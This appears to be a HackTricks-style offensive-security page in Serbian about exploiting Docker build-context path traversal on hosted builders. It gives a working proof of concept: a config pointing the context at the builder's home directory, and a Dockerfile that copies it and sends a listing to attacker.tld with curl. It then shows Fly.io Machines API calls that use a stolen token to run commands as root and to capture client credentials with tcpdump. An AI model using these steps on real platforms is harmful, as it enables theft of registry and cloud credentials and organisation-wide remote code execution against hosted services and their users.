# Zloupotreba Docker Build Context u Hosted Builders (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## Ukratko

Ako CI/CD platforma ili hosted builder dozvoljavaju contributorima da odrede Docker build context path i Dockerfile path, često možete postaviti context na parent directory (npr. "..") i učiniti fajlove sa hosta delom build context-a. Zatim attacker-controlled Dockerfile može da COPY i eksfiltrira tajne pronađene u home direktorijumu buildera (na primer, ~/.docker/config.json). Ukradeni registry tokens takođe mogu raditi protiv provider-ovih control-plane APIs, omogućavajući org-wide RCE.

## Površina napada

Mnoge hosted builder/registry usluge rade otprilike sledeće prilikom buildovanja image-a poslatih od strane korisnika:
- Pročitaju repo-nivo konfiguraciju koja uključuje:
  - build context path (poslat Docker daemonu)
  - Dockerfile path relativno u odnosu na taj context
- Kopiraju navedeni build context direktorijum i Dockerfile na Docker daemon
- Builduju image i pokreću ga kao hosted service

Ako platforma ne kanonizuje i ne ograničava build context, korisnik može da ga postavi na lokaciju izvan repozitorijuma (path traversal), što dovodi do toga da proizvoljni fajlovi sa hosta, koji su čitljivi build user-u, postanu deo build context-a i dostupni za COPY u Dockerfile-u.

Praktična ograničenja koja se često primećuju:
- Dockerfile mora biti unutar odabranog context path-a i njegova putanja mora biti poznata unapred.
- Build user mora imati read pristup fajlovima uključenim u context; specijalne device datoteke mogu pokvariti kopiranje.

## PoC: Path traversal via Docker build context

Primer zlonamernog server config-a koji deklariše Dockerfile unutar context-a roditeljskog direktorijuma:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
Napomene:
- Korišćenje ".." često se preslikava na home direktorijum korisnika 'builder' (npr. /home/builder), koji obično sadrži osetljive fajlove.
- Postavite vaš Dockerfile pod imenom direktorijuma repoa (npr. repo "test" → test/Dockerfile) tako da ostane unutar proširenog roditeljskog konteksta.

## PoC: Dockerfile za unošenje i eksfiltraciju host konteksta
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
Ciljevi koji se često pronalaze u $HOME:
- ~/.docker/config.json (registry auths/tokens)
- Ostali cloud/CLI keševi i konfiguracije (npr., ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

Savet: Čak i ako postoji .dockerignore u repozitorijumu, selekcija konteksta na strani platforme i dalje određuje šta se šalje ka daemonu. Ako platforma kopira izabrani put ka daemonu pre nego što proceni vaš repozitorijum’s .dockerignore, fajlovi sa hosta i dalje mogu biti izloženi.

## Pivot u oblaku sa overprivileged tokens (primer: Fly.io Machines API)

Neke platforme izdaju jedan bearer token koji se može koristiti i za container registry i za control-plane API. Ako eksfiltrujete registry token, probajte ga protiv provider API-ja.

Primer API poziva protiv Fly.io Machines API koristeći ukradeni token iz ~/.docker/config.json:

Nabroj aplikacije u organizaciji:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
Pokrenite komandu kao root unutar bilo koje mašine aplikacije:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
Ishod: remote code execution širom organizacije na svim hostovanim aplikacijama gde token ima dovoljne privilegije.

## Krađa tajni iz kompromitovanih hostovanih servisa

Sa exec/RCE na hostovanim serverima, možete prikupiti tajne koje su dostavili klijenti (API keys, tokens) ili izvesti prompt-injection napade. Primer: instalirajte tcpdump i snimite HTTP saobraćaj na portu 8080 kako biste izvukli dolazne kredencijale.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Snimljeni zahtevi često sadrže client credentials u headers, bodies, ili query params.

## References

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
